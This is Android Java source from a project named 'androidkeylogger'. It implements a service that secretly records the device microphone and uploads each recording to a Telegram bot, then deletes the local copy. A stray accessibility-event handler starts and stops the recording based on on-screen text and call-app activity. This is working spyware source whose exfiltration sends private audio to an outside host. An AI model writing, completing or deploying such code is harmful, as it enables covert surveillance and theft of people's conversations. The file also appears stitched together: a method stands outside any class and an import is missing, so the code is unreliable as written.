package com.bshu2.androidkeylogger;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import java.io.File;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MicrophoneRecorderService extends Service {
    private static final String TAG = "MicrophoneRecorderService";
    private static final String TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
    private static final String TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
    private MediaRecorder mediaRecorder;
    private File audioFile;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startRecording();
        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        stopRecording();
        super.onDestroy();
    }

    private void startRecording() {
        try {
            File dir = new File(Environment.getExternalStorageDirectory(), "Recordings");
            if (!dir.exists()) dir.mkdirs();

            audioFile = new File(dir, "recording_" + System.currentTimeMillis() + ".mp3");

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
            mediaRecorder.prepare();
            mediaRecorder.start();

            Log.d(TAG, "Recording started.");
        } catch (Exception e) {
            Log.e(TAG, "Error starting recording: ", e);
        }
    }

    private void stopRecording() {
        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;

                Log.d(TAG, "Recording stopped.");
                sendRecordingToTelegram();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping recording: ", e);
        }
    }

    private void sendRecordingToTelegram() {
        new Thread(() -> {
            try {
                String telegramUrl = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendDocument";
                String boundary = "*****";

                HttpURLConnection conn = (HttpURLConnection) new URL(telegramUrl).openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                OutputStream os = conn.getOutputStream();
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n").getBytes());
                os.write((TELEGRAM_CHAT_ID + "\r\n").getBytes());
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"document\"; filename=\"" + audioFile.getName() + "\"\r\n\r\n").getBytes());

                byte[] buffer = new byte[1024];
                int bytesRead;
                try (var fis = new FileInputStream(audioFile)) {
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        os.write(buffer, 0, bytesRead);
                    }
                }

                os.write(("\r\n--" + boundary + "--\r\n").getBytes());
                os.flush();
                os.close();

                Log.d(TAG, "Telegram Response Code: " + conn.getResponseCode());
                if (conn.getResponseCode() == 200) {
                    audioFile.delete();
                    Log.d(TAG, "Recording sent and file deleted.");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error sending recording to Telegram: ", e);
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}

@Override
public void onAccessibilityEvent(AccessibilityEvent event) {
    switch (event.getEventType()) {
        case AccessibilityEvent.TYPE_VIEW_CLICKED:
        case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
            String data = event.getText().toString().toLowerCase();
            if (data.contains("microphone") || data.contains("record")) {
                Log.d(TAG, "Microphone activity detected. Starting recording service.");
                startService(new Intent(this, MicrophoneRecorderService.class));
            } else if (event.getPackageName().toString().contains("call")) {
                Log.d(TAG, "Call ended. Stopping recording service.");
                stopService(new Intent(this, MicrophoneRecorderService.class));
            }
            break;
        default:
            break;
    }
}

